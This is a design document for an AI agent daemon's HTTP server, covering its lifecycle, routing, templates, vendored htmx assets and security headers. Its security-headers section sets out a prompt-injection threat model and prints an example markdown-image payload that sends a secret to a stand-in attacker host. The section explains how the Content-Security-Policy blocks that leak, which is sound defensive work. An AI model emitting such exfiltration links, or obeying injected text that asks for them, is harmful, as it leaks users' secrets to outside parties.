# HTTP server

The core runs one HTTP server (PLAN section 9) for web chat, the admin pages, and the login flow. It
lives in `giles_core::http`, is built on `axum`, renders pages with `askama` templates compiled into
the binary, and ships its JavaScript (`htmx`, its SSE extension, and one small script of our own for
the new-agent form) inside the binary too. There is no build step. TLS is terminated by a reverse
proxy, never by Giles.

## Lifecycle

`giles serve` (see [The `giles` Binary](daemon.md#giles-serve-lifecycle)):

1. `http::bind(config.core.http_listen)` opens the listener before `giles started` is logged, so a
   busy or forbidden address is a startup error: `cannot listen for HTTP on <addr>` with the OS
   error as the cause (`http::BindError { addr, source }`).
2. `http::RouterBuilder::new().build()` assembles the application, and
   `http::serve(listener, app, shutdown)` runs on its own task. `serve` takes any
   `axum::serve::Listener`: the TCP listener here, or a `tokio::net::UnixListener` (the web
   channel's trusted-proxy socket). The `giles started` line carries `http=http://<addr>/` (the
   bound address, so port `0` shows the port the OS picked).
3. When the shutdown token is cancelled, the server stops accepting connections, closes idle
   keep-alive connections, and waits for in-flight requests, for at most `http::DRAIN_TIMEOUT` (5
   s). Requests still open then are dropped with a warning, and `serve` returns; the runtime
   shutting down cancels their tasks. `serve` awaits the server before logging `giles stopped`.
4. If the server task ends before shutdown (it shouldn't: accept errors are retried), `serve`
   cancels the token and exits with an error instead of running on without its web interface.

Long-lived responses must end by themselves when the daemon stops: an SSE stream should finish on
the shutdown token (`stream.take_until(token.cancelled_owned())`). The drain deadline is only a
backstop, and without it one open event stream would hang shutdown forever, since `axum`'s graceful
shutdown waits for every open request.

## Extending the router

`http::RouterBuilder` is the one place routes are added:

```rust
let app = http::RouterBuilder::new()   // `/static/*`, and a placeholder `/`
    .home(get(chats).with_state(s))    // replaces the placeholder `/` (the web channel's chats)
    .merge(web::routes(web_state))     // chat pages, SSE, `/blobs/<sha256>`, login
    .merge(admin::routes(admin_state)) // 3.8
    .build();                          // `/`, 404 fallback, security headers
```

Rules for a module's `routes(..) -> axum::Router`:

- Return a `Router<()>`: apply the module's own state with `.with_state(state)` before returning, so
  routers with different state types merge.
- Don't overlap existing routes; `axum` panics on a duplicate path at startup. `/` is added by
  `build`: the placeholder home page, or the `MethodRouter` given to `RouterBuilder::home`; never
  merge a route for `/`. `/static/` belongs to the asset module.
- Don't set a fallback; `build` adds the 404 page.
- Don't add security headers; `build` adds them to every response, merged routes included. A handler
  may add its own `Content-Security-Policy` (see below), which only tightens the policy.
- Render pages with `http::render(&page)`: HTML with `text/html; charset=utf-8`, or a logged error
  and a bare 500.

## Pages and templates

Templates live in `crates/giles-core/templates/` (askama's default directory) and are compiled into
the binary by `#[derive(askama::Template)]`; a template error is a compile error.

`layout.html` is the base every page extends. It has three blocks:

- `title` (default `Giles`).
- `head` (default empty), for a page's own `<script src>` or `<link>`; the new-agent form loads its
  script here.
- `content`, inside `<main>`.

It links the stylesheet and both scripts through the asset constants
(`{{ crate::http::assets::HTMX.path }}`), so no page ever hard-codes an asset path. The scripts are
`defer`red, `htmx` first: the extension registers itself with the global `htmx` when it loads. Pages
that stream turn the extension on where they use it (`hx-ext="sse"`).

The layout also sets `htmx`'s configuration through a `<meta name="htmx-config">` tag:

- `includeIndicatorStyles: false`: otherwise `htmx` injects an inline `<style>` for its request
  indicator, which `style-src 'self'` blocks. The stylesheet carries the same rules instead: an idle
  `.htmx-indicator` is transparent and `visibility: hidden` (so it can't be clicked, focused, or
  read out), and becomes visible with a fade while its element or an ancestor has `.htmx-request`.
- `allowEval: false`: `hx-on`, `js:` values, and event filters need `eval`, which the policy forbids
  anyway; with this `htmx` refuses them up front (an `htmx:evalDisallowedError` event) instead of
  tripping a CSP violation.
- `allowScriptTags: false`: `htmx` doesn't execute `<script>` tags found in swapped-in content.
  Giles never sends any, so this only matters if something slips through the renderer.

The home page (`index.html`) shows the version; it's `/` only when no web channel is configured
(with one, `/` is the chat list: [Web channel](web-channel.md)). `not_found.html` is the 404 page.

## Static assets

`http::assets` serves files embedded with `include_bytes!`, from memory, under `/static/`:

| Path                                 | File                                          | Content-Type                     |
| ------------------------------------ | --------------------------------------------- | -------------------------------- |
| `/static/htmx-2.0.11.min.js`         | `assets/vendor/htmx-2.0.11/htmx.min.js`       | `text/javascript; charset=utf-8` |
| `/static/htmx-ext-sse-2.2.4.min.js`  | `assets/vendor/htmx-ext-sse-2.2.4/sse.min.js` | `text/javascript; charset=utf-8` |
| `/static/giles-<hash>.css`           | `assets/giles.css`                            | `text/css; charset=utf-8`        |
| `/static/agent-form-<hash>.js`       | `assets/agent-form.js`                        | `text/javascript; charset=utf-8` |
| `/static/mcp-server-form-<hash>.js`  | `assets/mcp-server-form.js`                   | `text/javascript; charset=utf-8` |

Each path changes whenever its content does: the vendored files carry their version, and our own
files carry the first 16 hex digits of their SHA-256 (`assets::stylesheet_path()`,
`assets::agent_form_script_path()`, and `assets::mcp_server_form_script_path()`, computed once). So
every asset is served with `Cache-Control: public, max-age=31536000, immutable`, and a browser never
revalidates or keeps a stale copy across an upgrade. `HEAD` works on every asset; any other method
is a 405, and an unknown path under `/static/` gets the 404 page.

### Vendored files

Both come from the npm registry, are licensed 0BSD (each directory holds its upstream `LICENSE`),
and are committed exactly as published:

| Package             | Version | File               | SHA-256 of the file                                                |
| ------------------- | ------- | ------------------ | ------------------------------------------------------------------ |
| `htmx.org`          | 2.0.11  | `dist/htmx.min.js` | `d6fdc75f204e6bdefa99b69bf1e6d4ac69b8a364f77929f45c13476b4000f717` |
| `htmx-ext-sse`      | 2.2.4   | `dist/sse.min.js`  | `98a46496de0c3605fbffdce9167ba427bdd9553184f83f149c261891a92c0136` |

The tarballs were checked against the registry's `dist.integrity` before extraction:

- `htmx.org-2.0.11.tgz`:
  `sha512-Thx/WtpeOQqSrqBCw/A1cwGJGg4UrVa3+sW0GmrM3p4gJgO89ecH4qtbnyzDDWFvBTqjnIMCgELTNt636dtamA==`
- `htmx-ext-sse-2.2.4.tgz`:
  `sha512-LJmxVhykyflBWgh5PvbRidcyuqMHlgfajmmzumvKctv9puvsufeH6OaejSMZTNTnEI8O2wXXn4ZZtBdpEMqmEQ==`

`htmx` 2.0.11 is npm's `latest`; 4.0 (tagged `next`) is a rewrite whose extensions don't carry over,
so moving to it is a deliberate upgrade of its own. A test checks both files against the SHA-256
values above and that the `htmx` path's version matches the version inside the file. To upgrade:
download the release tarball, compare it with `dist.integrity`
(`curl -s https://registry.npmjs.org/<package>/<version> | jq .dist`), copy the file and its
`LICENSE` into a new versioned directory, and update the `Asset` constant, this table, and the test.

## Security headers

`RouterBuilder::build` wraps the whole router (merged routes, the 404 fallback, and `axum`'s own 405
responses) in an `axum::middleware::map_response` layer that sets:

| Header                         | Value                       |
| ------------------------------ | --------------------------- |
| `Content-Security-Policy`      | the policy below (appended) |
| `X-Content-Type-Options`       | `nosniff`                   |
| `Referrer-Policy`              | `no-referrer`               |
| `X-Frame-Options`              | `DENY`                      |
| `Cross-Origin-Opener-Policy`   | `same-origin`               |
| `Cross-Origin-Resource-Policy` | `same-origin`               |

The policy:

```text
default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self';
object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'
```

Why each part:

- The threat that matters most is agent output: model text is attacker-influenced (prompt
  injection), and the web channel renders it as HTML. The renderer (see
  [Rendering model output](rendering.md)) already escapes raw HTML and drops remote images; the
  policy is the second wall.
- `img-src 'self' data:` (PLAN section 9): a reply like `![](https://attacker/?d=<secret>)` would
  leak data with no tool call. Images come only from this origin (`/blobs/<sha256>`) and `data:`
  URLs, the two kinds the renderer keeps.
- `script-src 'self'` and `style-src 'self'`, no `'unsafe-inline'` or `'unsafe-eval'`: the only
  scripts are the two vendored files, `agent-form.js` (only the new-agent form loads it), and
  `mcp-server-form.js` (only the MCP server form loads it), each through the layout's `head` block,
  and the only stylesheet is `giles.css`. Any injected `<script>`, `on*=` handler, or `javascript:`
  URL is inert even if it got past the renderer. This also blocks inline `style="..."` attributes,
  so pages style with classes. Note for 2.22: `pulldown-cmark` writes table column alignment as
  `style="text-align: ..."`, which browsers drop (and log as a violation) under this policy; tables
  still render, unaligned.
- `connect-src 'self'`: `htmx` requests and the SSE `EventSource` go to this origin only. Already
  implied by `default-src`, but stated because the SSE extension depends on it.
- `default-src 'self'`: everything not named (fonts, media for audio attachments, manifests,
  workers) is same-origin only.
- `object-src 'none'`: no plugins (`<object>`, `<embed>`).
- `base-uri 'none'`: an injected `<base href>` can't redirect the page's relative URLs.
- `frame-ancestors 'none'` and `X-Frame-Options: DENY`: no other site can frame the UI (clickjacking
  an approval button). `X-Frame-Options` is for browsers without `frame-ancestors`.
- `form-action 'self'`: an injected `<form>` can't post to another site.
- `X-Content-Type-Options: nosniff`: browsers use the declared type, so a blob served as
  `text/plain` is never sniffed as HTML or script.
- `Referrer-Policy: no-referrer`: links in agent output are clicked from conversation URLs, and the
  conversation id shouldn't leak to whatever site the link points to.
- `Cross-Origin-Opener-Policy: same-origin`: a page opened from a link in a reply gets no
  `window.opener` handle back to Giles.
- `Cross-Origin-Resource-Policy: same-origin`: other sites can't embed Giles responses (blobs,
  scripts) as subresources, which closes cross-origin leaks via timing or size of a logged-in user's
  blobs.

Not set, on purpose: `Strict-Transport-Security` (Giles speaks plain HTTP behind the TLS proxy,
which sets it), `upgrade-insecure-requests` (it would break the plain-HTTP localhost case), and
`require-trusted-types-for` (`htmx` parses HTML with `DOMParser` and assigns `innerHTML`, which
Trusted Types would block).

How handlers interact with the layer:

- `Content-Security-Policy` is appended: a handler may set its own, and browsers enforce every
  policy on a response, so the result is at least as strict as the base. The web channel's blob
  route adds `Content-Security-Policy: sandbox` this way, so a stored HTML blob can't run script in
  Giles's origin.
- The other five are overwritten, so no handler can weaken them by accident.

## Tests

`crates/giles-core/src/http/tests.rs` (router-level with `tower::ServiceExt::oneshot`, plus real
servers on `127.0.0.1:0`) and `crates/giles/tests/serve.rs` (the daemon end to end):

- Every response has every header: pages, assets, `HEAD`, 404s (including unknown `/static/` paths),
  405s, and merged routes; a merged handler's own policy is kept next to the base and its
  `X-Frame-Options` is replaced.
- Each asset is served byte-for-byte with its content type and the immutable cache header; the
  vendored files match the recorded checksums; the stylesheet and form script paths are their
  content hashes, and the script's id derivation is pinned to the Rust function's expression.
- The layout renders: doctype, title block, stylesheet link, both scripts in order, the
  `htmx-config` meta; pages contain no inline script or style; the 404 page uses the layout.
- A real server answers over TCP and returns once the token is cancelled; a request that never
  finishes doesn't hold shutdown past the drain deadline; a busy address fails `bind` with the
  address in the message.
- `giles serve` answers on `core.http_listen`, stops listening when it exits, and fails at startup
  when the address is taken.
